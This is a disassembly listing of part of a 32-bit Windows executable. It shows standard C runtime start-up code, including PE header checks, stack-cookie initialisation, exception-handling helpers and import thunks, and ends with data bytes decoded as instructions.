  4076aa:	push   ebx
  4076ab:	push   esi
  4076ac:	push   edi
  4076ad:	mov    ecx,DWORD PTR [eax+0x3c]
  4076b0:	add    ecx,eax
  4076b2:	movzx  eax,WORD PTR [ecx+0x14]
  4076b6:	movzx  ebx,WORD PTR [ecx+0x6]
  4076ba:	add    eax,0x18
  4076bd:	add    eax,ecx
  4076bf:	test   ebx,ebx
  4076c1:	je     0x4076de
  4076c3:	mov    edi,DWORD PTR [ebp+0xc]
  4076c6:	mov    esi,DWORD PTR [eax+0xc]
  4076c9:	cmp    edi,esi
  4076cb:	jb     0x4076d6
  4076cd:	mov    ecx,DWORD PTR [eax+0x8]
  4076d0:	add    ecx,esi
  4076d2:	cmp    edi,ecx
  4076d4:	jb     0x4076e0
  4076d6:	inc    edx
  4076d7:	add    eax,0x28
  4076da:	cmp    edx,ebx
  4076dc:	jb     0x4076c6
  4076de:	xor    eax,eax
  4076e0:	pop    edi
  4076e1:	pop    esi
  4076e2:	pop    ebx
  4076e3:	pop    ebp
  4076e4:	ret    
  4076e5:	int3   
  4076e6:	int3   
  4076e7:	int3   
  4076e8:	int3   
  4076e9:	int3   
  4076ea:	int3   
  4076eb:	int3   
  4076ec:	int3   
  4076ed:	int3   
  4076ee:	int3   
  4076ef:	int3   
  4076f0:	mov    edi,edi
  4076f2:	push   ebp
  4076f3:	mov    ebp,esp
  4076f5:	push   0xfffffffe
  4076f7:	push   0x407c08
  4076fc:	push   0x407920
  407701:	mov    eax,fs:0x0
  407707:	push   eax
  407708:	sub    esp,0x8
  40770b:	push   ebx
  40770c:	push   esi
  40770d:	push   edi
  40770e:	mov    eax,ds:0x408008
  407713:	xor    DWORD PTR [ebp-0x8],eax
  407716:	xor    eax,ebp
  407718:	push   eax
  407719:	lea    eax,[ebp-0x10]
  40771c:	mov    fs:0x0,eax
  407722:	mov    DWORD PTR [ebp-0x18],esp
  407725:	mov    DWORD PTR [ebp-0x4],0x0
  40772c:	push   0x400000
  407731:	call   0x4077c0
  407736:	add    esp,0x4
  407739:	test   eax,eax
  40773b:	je     0x407791
  40773d:	mov    eax,DWORD PTR [ebp+0x8]
  407740:	sub    eax,0x400000
  407745:	push   eax
  407746:	push   0x400000
  40774b:	call   0x4076a0
  407750:	add    esp,0x8
  407753:	test   eax,eax
  407755:	je     0x407791
  407757:	mov    eax,DWORD PTR [eax+0x24]
  40775a:	shr    eax,0x1f
  40775d:	not    eax
  40775f:	and    eax,0x1
  407762:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  407769:	mov    ecx,DWORD PTR [ebp-0x10]
  40776c:	mov    DWORD PTR fs:0x0,ecx
  407773:	pop    ecx
  407774:	pop    edi
  407775:	pop    esi
  407776:	pop    ebx
  407777:	mov    esp,ebp
  407779:	pop    ebp
  40777a:	ret    
  40777b:	mov    eax,DWORD PTR [ebp-0x14]
  40777e:	mov    eax,DWORD PTR [eax]
  407780:	xor    ecx,ecx
  407782:	cmp    DWORD PTR [eax],0xc0000005
  407788:	sete   cl
  40778b:	mov    eax,ecx
  40778d:	ret    
  40778e:	mov    esp,DWORD PTR [ebp-0x18]
  407791:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  407798:	xor    eax,eax
  40779a:	mov    ecx,DWORD PTR [ebp-0x10]
  40779d:	mov    DWORD PTR fs:0x0,ecx
  4077a4:	pop    ecx
  4077a5:	pop    edi
  4077a6:	pop    esi
  4077a7:	pop    ebx
  4077a8:	mov    esp,ebp
  4077aa:	pop    ebp
  4077ab:	ret    
  4077ac:	int3   
  4077ad:	int3   
  4077ae:	int3   
  4077af:	int3   
  4077b0:	int3   
  4077b1:	int3   
  4077b2:	int3   
  4077b3:	int3   
  4077b4:	int3   
  4077b5:	int3   
  4077b6:	int3   
  4077b7:	int3   
  4077b8:	int3   
  4077b9:	int3   
  4077ba:	int3   
  4077bb:	int3   
  4077bc:	int3   
  4077bd:	int3   
  4077be:	int3   
  4077bf:	int3   
  4077c0:	mov    edi,edi
  4077c2:	push   ebp
  4077c3:	mov    ebp,esp
  4077c5:	mov    eax,DWORD PTR [ebp+0x8]
  4077c8:	mov    ecx,0x5a4d
  4077cd:	cmp    WORD PTR [eax],cx
  4077d0:	je     0x4077d6
  4077d2:	xor    eax,eax
  4077d4:	pop    ebp
  4077d5:	ret    
  4077d6:	mov    ecx,DWORD PTR [eax+0x3c]
  4077d9:	add    ecx,eax
  4077db:	xor    eax,eax
  4077dd:	cmp    DWORD PTR [ecx],0x4550
  4077e3:	jne    0x4077f1
  4077e5:	mov    edx,0x10b
  4077ea:	cmp    WORD PTR [ecx+0x18],dx
  4077ee:	sete   al
  4077f1:	pop    ebp
  4077f2:	ret    
  4077f3:	int3   
  4077f4:	int3   
  4077f5:	int3   
  4077f6:	int3   
  4077f7:	int3   
  4077f8:	mov    edi,edi
  4077fa:	push   ebp
  4077fb:	mov    ebp,esp
  4077fd:	sub    esp,0x14
  407800:	and    DWORD PTR [ebp-0xc],0x0
  407804:	and    DWORD PTR [ebp-0x8],0x0
  407808:	mov    eax,ds:0x408008
  40780d:	push   esi
  40780e:	push   edi
  40780f:	mov    edi,0xbb40e64e
  407814:	mov    esi,0xffff0000
  407819:	cmp    eax,edi
  40781b:	je     0x40782a
  40781d:	test   esi,eax
  40781f:	je     0x40782a
  407821:	not    eax
  407823:	mov    ds:0x40800c,eax
  407828:	jmp    0x407894
  40782a:	lea    eax,[ebp-0xc]
  40782d:	push   eax
  40782e:	call   DWORD PTR ds:0x4091b0
  407834:	mov    eax,DWORD PTR [ebp-0x8]
  407837:	xor    eax,DWORD PTR [ebp-0xc]
  40783a:	mov    DWORD PTR [ebp-0x4],eax
  40783d:	call   DWORD PTR ds:0x409188
  407843:	xor    DWORD PTR [ebp-0x4],eax
  407846:	call   DWORD PTR ds:0x40902c
  40784c:	xor    DWORD PTR [ebp-0x4],eax
  40784f:	call   DWORD PTR ds:0x4091ac
  407855:	xor    eax,DWORD PTR [ebp-0x4]
  407858:	lea    ecx,[ebp-0x4]
  40785b:	xor    eax,ecx
  40785d:	mov    DWORD PTR [ebp-0x4],eax
  407860:	lea    eax,[ebp-0x14]
  407863:	push   eax
  407864:	call   DWORD PTR ds:0x40919c
  40786a:	mov    eax,DWORD PTR [ebp-0x10]
  40786d:	xor    eax,DWORD PTR [ebp-0x14]
  407870:	mov    ecx,DWORD PTR [ebp-0x4]
  407873:	xor    ecx,eax
  407875:	cmp    ecx,edi
  407877:	je     0x407881
  407879:	test   DWORD PTR ds:0x408008,esi
  40787f:	jne    0x407886
  407881:	mov    ecx,0xbb40e64f
  407886:	mov    DWORD PTR ds:0x408008,ecx
  40788c:	not    ecx
  40788e:	mov    DWORD PTR ds:0x40800c,ecx
  407894:	pop    edi
  407895:	pop    esi
  407896:	mov    esp,ebp
  407898:	pop    ebp
  407899:	ret    
  40789a:	int3   
  40789b:	int3   
  40789c:	int3   
  40789d:	int3   
  40789e:	int3   
  40789f:	push   0x30000
  4078a4:	push   0x10000
  4078a9:	call   DWORD PTR ds:0x409204
  4078af:	pop    ecx
  4078b0:	pop    ecx
  4078b1:	ret    
  4078b2:	int3   
  4078b3:	int3   
  4078b4:	int3   
  4078b5:	int3   
  4078b6:	int3   
  4078b7:	int3   
  4078b8:	jmp    DWORD PTR ds:0x4091d4
  4078be:	int3   
  4078bf:	int3   
  4078c0:	int3   
  4078c1:	int3   
  4078c2:	int3   
  4078c3:	int3   
  4078c4:	push   0x407920
  4078c9:	push   DWORD PTR fs:0x0
  4078d0:	mov    eax,DWORD PTR [esp+0x10]
  4078d4:	mov    DWORD PTR [esp+0x10],ebp
  4078d8:	lea    ebp,[esp+0x10]
  4078dc:	sub    esp,eax
  4078de:	push   ebx
  4078df:	push   esi
  4078e0:	push   edi
  4078e1:	mov    eax,ds:0x408008
  4078e6:	xor    DWORD PTR [ebp-0x4],eax
  4078e9:	xor    eax,ebp
  4078eb:	mov    DWORD PTR [ebp-0x1c],eax
  4078ee:	push   eax
  4078ef:	mov    DWORD PTR [ebp-0x18],esp
  4078f2:	push   DWORD PTR [ebp-0x8]
  4078f5:	mov    eax,DWORD PTR [ebp-0x4]
  4078f8:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4078ff:	mov    DWORD PTR [ebp-0x8],eax
  407902:	lea    eax,[ebp-0x10]
  407905:	mov    fs:0x0,eax
  40790b:	ret    
  40790c:	mov    ecx,DWORD PTR [ebp-0x1c]
  40790f:	xor    ecx,ebp
  407911:	call   0x4071f0
  407916:	jmp    0x407a8d
  40791b:	int3   
  40791c:	int3   
  40791d:	int3   
  40791e:	int3   
  40791f:	int3   
  407920:	mov    edi,edi
  407922:	push   ebp
  407923:	mov    ebp,esp
  407925:	push   DWORD PTR [ebp+0x14]
  407928:	push   DWORD PTR [ebp+0x10]
  40792b:	push   DWORD PTR [ebp+0xc]
  40792e:	push   DWORD PTR [ebp+0x8]
  407931:	push   0x4071f0
  407936:	push   0x408008
  40793b:	call   0x407aa6
  407940:	add    esp,0x18
  407943:	pop    ebp
  407944:	ret    
  407945:	int3   
  407946:	int3   
  407947:	int3   
  407948:	int3   
  407949:	int3   
  40794a:	int3   
  40794b:	int3   
  40794c:	int3   
  40794d:	int3   
  40794e:	int3   
  40794f:	int3   
  407950:	ret    
  407951:	int3   
  407952:	int3   
  407953:	int3   
  407954:	int3   
  407955:	int3   
  407956:	jmp    DWORD PTR ds:0x4091cc
  40795c:	int3   
  40795d:	int3   
  40795e:	int3   
  40795f:	int3   
  407960:	int3   
  407961:	int3   
  407962:	jmp    DWORD PTR ds:0x4091c4
  407968:	int3   
  407969:	int3   
  40796a:	int3   
  40796b:	int3   
  40796c:	int3   
  40796d:	int3   
  40796e:	jmp    DWORD PTR ds:0x4091c8
  407974:	int3   
  407975:	int3   
  407976:	int3   
  407977:	int3   
  407978:	int3   
  407979:	int3   
  40797a:	jmp    DWORD PTR ds:0x4091e4
  407980:	int3   
  407981:	int3   
  407982:	int3   
  407983:	int3   
  407984:	int3   
  407985:	jmp    0x40798f
  40798a:	int3   
  40798b:	int3   
  40798c:	int3   
  40798d:	int3   
  40798e:	int3   
  40798f:	mov    edi,edi
  407991:	push   ebp
  407992:	mov    ebp,esp
  407994:	sub    esp,0x2d0
  40799a:	mov    eax,ds:0x408008
  40799f:	xor    eax,ebp
  4079a1:	mov    DWORD PTR [ebp-0x4],eax
  4079a4:	mov    DWORD PTR [ebp-0x220],eax
  4079aa:	mov    DWORD PTR [ebp-0x224],ecx
  4079b0:	mov    DWORD PTR [ebp-0x228],edx
  4079b6:	mov    DWORD PTR [ebp-0x22c],ebx
  4079bc:	mov    DWORD PTR [ebp-0x230],esi
  4079c2:	mov    DWORD PTR [ebp-0x234],edi
  4079c8:	data16 mov WORD PTR [ebp-0x208],ss
  4079cf:	data16 mov WORD PTR [ebp-0x214],cs
  4079d6:	data16 mov WORD PTR [ebp-0x238],ds
  4079dd:	data16 mov WORD PTR [ebp-0x23c],es
  4079e4:	data16 mov WORD PTR [ebp-0x240],fs
  4079eb:	data16 mov WORD PTR [ebp-0x244],gs
  4079f2:	pushf  
  4079f3:	pop    DWORD PTR [ebp-0x210]
  4079f9:	mov    eax,DWORD PTR [ebp+0x4]
  4079fc:	mov    DWORD PTR [ebp-0x218],eax
  407a02:	lea    eax,[ebp+0x4]
  407a05:	mov    DWORD PTR [ebp-0x2d0],0x10001
  407a0f:	mov    DWORD PTR [ebp-0x20c],eax
  407a15:	mov    eax,DWORD PTR [eax-0x4]
  407a18:	push   0x401178
  407a1d:	mov    DWORD PTR [ebp-0x21c],eax
  407a23:	call   DWORD PTR ds:0x409120
  407a29:	mov    ecx,DWORD PTR [ebp-0x4]
  407a2c:	xor    ecx,ebp
  407a2e:	call   0x4071f0
  407a33:	mov    esp,ebp
  407a35:	pop    ebp
  407a36:	ret    
  407a37:	int3   
  407a38:	int3   
  407a39:	int3   
  407a3a:	int3   
  407a3b:	int3   
  407a3c:	jmp    DWORD PTR ds:0x4091f4
  407a42:	int3   
  407a43:	int3   
  407a44:	int3   
  407a45:	int3   
  407a46:	int3   
  407a47:	int3   
  407a48:	push   0x407920
  407a4d:	push   DWORD PTR fs:0x0
  407a54:	mov    eax,DWORD PTR [esp+0x10]
  407a58:	mov    DWORD PTR [esp+0x10],ebp
  407a5c:	lea    ebp,[esp+0x10]
  407a60:	sub    esp,eax
  407a62:	push   ebx
  407a63:	push   esi
  407a64:	push   edi
  407a65:	mov    eax,ds:0x408008
  407a6a:	xor    DWORD PTR [ebp-0x4],eax
  407a6d:	xor    eax,ebp
  407a6f:	push   eax
  407a70:	mov    DWORD PTR [ebp-0x18],esp
  407a73:	push   DWORD PTR [ebp-0x8]
  407a76:	mov    eax,DWORD PTR [ebp-0x4]
  407a79:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  407a80:	mov    DWORD PTR [ebp-0x8],eax
  407a83:	lea    eax,[ebp-0x10]
  407a86:	mov    fs:0x0,eax
  407a8c:	ret    
  407a8d:	mov    ecx,DWORD PTR [ebp-0x10]
  407a90:	mov    DWORD PTR fs:0x0,ecx
  407a97:	pop    ecx
  407a98:	pop    edi
  407a99:	pop    edi
  407a9a:	pop    esi
  407a9b:	pop    ebx
  407a9c:	mov    esp,ebp
  407a9e:	pop    ebp
  407a9f:	push   ecx
  407aa0:	ret    
  407aa1:	int3   
  407aa2:	int3   
  407aa3:	int3   
  407aa4:	int3   
  407aa5:	int3   
  407aa6:	jmp    DWORD PTR ds:0x409208
  407aac:	int3   
  407aad:	int3   
  407aae:	int3   
  407aaf:	int3   
  407ab0:	int3   
  407ab1:	int3   
  407ab2:	int3   
  407ab3:	int3   
  407ab4:	int3   
  407ab5:	int3   
  407ab6:	int3   
  407ab7:	int3   
  407ab8:	int3   
  407ab9:	int3   
  407aba:	int3   
  407abb:	int3   
  407abc:	int3   
  407abd:	int3   
  407abe:	int3   
  407abf:	int3   
  407ac0:	push   ecx
  407ac1:	lea    ecx,[esp+0x4]
  407ac5:	sub    ecx,eax
  407ac7:	sbb    eax,eax
  407ac9:	not    eax
  407acb:	and    ecx,eax
  407acd:	mov    eax,esp
  407acf:	and    eax,0xfffff000
  407ad4:	cmp    ecx,eax
  407ad6:	jb     0x407ae2
  407ad8:	mov    eax,ecx
  407ada:	pop    ecx
  407adb:	xchg   esp,eax
  407adc:	mov    eax,DWORD PTR [eax]
  407ade:	mov    DWORD PTR [esp],eax
  407ae1:	ret    
  407ae2:	sub    eax,0x1000
  407ae7:	test   DWORD PTR [eax],eax
  407ae9:	jmp    0x407ad4
  407aeb:	int3   
  407aec:	int3   
  407aed:	int3   
  407aee:	int3   
  407aef:	int3   
  407af0:	jmp    DWORD PTR ds:0x409244
  407af6:	int3   
  407af7:	int3   
  407af8:	int3   
  407af9:	int3   
  407afa:	int3   
  407afb:	int3   
  407afc:	int3   
  407afd:	int3   
  407afe:	int3   
  407aff:	int3   
  407b00:	mov    DWORD PTR ds:0x408410,0x401358
  407b0a:	mov    ecx,0x408410
  407b0f:	jmp    0x40261f
  407b14:	int3   
  407b15:	int3   
  407b16:	int3   
  407b17:	int3   
  407b18:	int3   
  407b19:	int3   
  407b1a:	int3   
  407b1b:	int3   
  407b1c:	int3   
  407b1d:	int3   
  407b1e:	int3   
  407b1f:	int3   
  407b20:	push   0x408474
  407b25:	call   DWORD PTR ds:0x40903c
  407b2b:	jmp    0x4055f0
  407b30:	int3   
  407b31:	int3   
  407b32:	int3   
  407b33:	int3   
  407b34:	int3   
  407b35:	int3   
  407b36:	int3   
  407b37:	int3   
  407b38:	int3   
  407b39:	int3   
  407b3a:	int3   
  407b3b:	int3   
  407b3c:	int3   
  407b3d:	int3   
  407b3e:	int3   
  407b3f:	int3   
  407b40:	mov    edx,DWORD PTR ds:0x408460
  407b46:	call   0x405678
  407b4b:	jmp    0x40570c
  407b50:	int3   
  407b51:	int3   
  407b52:	int3   
  407b53:	int3   
  407b54:	int3   
  407b55:	int3   
  407b56:	int3   
  407b57:	int3   
  407b58:	int3   
  407b59:	int3   
  407b5a:	int3   
  407b5b:	int3   
  407b5c:	int3   
  407b5d:	int3   
  407b5e:	int3   
  407b5f:	int3   
  407b60:	mov    ecx,0x408498
  407b65:	jmp    0x4058a7
  407b6a:	int3   
  407b6b:	int3   
  407b6c:	int3   
  407b6d:	int3   
  407b6e:	int3   
  407b6f:	int3   
  407b70:	mov    DWORD PTR ds:0x40803c,0x401418
  407b7a:	ret    
  407b7b:	int3   
  407b7c:	int3   
  407b7d:	int3   
  407b7e:	int3   
  407b7f:	int3   
  407b80:	(bad)  
  407b81:	(bad)  
  407b82:	(bad)  
  407b83:	inc    DWORD PTR [eax]
  407b85:	add    BYTE PTR [eax],al
  407b87:	add    ah,dl
  407b89:	(bad)  
  407b8a:	(bad)  
  407b8b:	inc    DWORD PTR [eax]
  407b8d:	add    BYTE PTR [eax],al
  407b8f:	add    dh,bh
  407b91:	(bad)  
  407b92:	(bad)  
  407b93:	dec    DWORD PTR [ecx-0x63ffbfdb]
  407b99:	and    eax,0x40
  407b9e:	add    BYTE PTR [eax],al
  407ba0:	in     al,0xff
  407ba2:	(bad)  
  407ba3:	inc    DWORD PTR [eax]
  407ba5:	add    BYTE PTR [eax],al
  407ba7:	add    BYTE PTR [edi+edi*8+0xffff],al
  407bae:	add    BYTE PTR [eax],al
  407bb0:	(bad)  
  407bb1:	(bad)  
  407bb2:	(bad)  
  407bb3:	jmp    FWORD PTR [eax+0x71]
  407bb6:	inc    eax
  407bb7:	add    BYTE PTR [ecx+esi*2+0x40],ch
  407bbb:	add    dh,bh
  407bbd:	(bad)  
  407bbe:	(bad)  
  407bbf:	call   FWORD PTR [ecx+esi*2]
  407bc2:	inc    eax
  407bc3:	add    BYTE PTR [eax],dh
  407bc5:	jno    0x407c07
  407bc7:	add    ah,ah
  407bc9:	(bad)  
  407bca:	(bad)  
  407bcb:	inc    DWORD PTR [eax]
  407bcd:	add    BYTE PTR [eax],al
  407bcf:	add    al,cl
  407bd1:	(bad)  
  407bd2:	(bad)  
  407bd3:	inc    DWORD PTR [eax]
  407bd5:	add    BYTE PTR [eax],al
  407bd7:	add    dh,bh
  407bd9:	(bad)  
  407bda:	(bad)  
  407bdb:	inc    DWORD PTR [eax]
  407bdd:	add    BYTE PTR [eax],al
  407bdf:	add    BYTE PTR [esi+0x4072],bl
  407be5:	add    BYTE PTR [eax],al
  407be7:	add    dh,bh
  407be9:	(bad)  
  407bea:	(bad)  
  407beb:	inc    DWORD PTR [eax]
  407bed:	add    BYTE PTR [eax],al
  407bef:	add    ah,dl
  407bf1:	(bad)  
  407bf2:	(bad)  
  407bf3:	inc    DWORD PTR [eax]
  407bf5:	add    BYTE PTR [eax],al
  407bf7:	add    dh,bh
  407bf9:	(bad)  
  407bfa:	(bad)  
  407bfb:	call   FWORD PTR [esi+esi*2]
  407bfe:	inc    eax
  407bff:	add    BYTE PTR [eax],ah
  407c01:	jbe    0x407c43
  407c03:	add    BYTE PTR [eax],al
  407c05:	add    BYTE PTR [eax],al
  407c07:	add    dh,bh
  407c09:	(bad)  
  407c0a:	(bad)  
  407c0b:	inc    DWORD PTR [eax]
  407c0d:	add    BYTE PTR [eax],al
  407c0f:	add    al,bl
  407c11:	(bad)  
  407c12:	(bad)  
  407c13:	inc    DWORD PTR [eax]
  407c15:	add    BYTE PTR [eax],al
  407c17:	add    dh,bh
  407c19:	(bad)  
  407c1a:	(bad)  
  407c1b:	(bad)  
  407c1c:	jnp    0x407c95
  407c1e:	inc    eax
  407c1f:	.byte 0x0
  407c20:	mov    ?,WORD PTR [edi+0x40]
	...
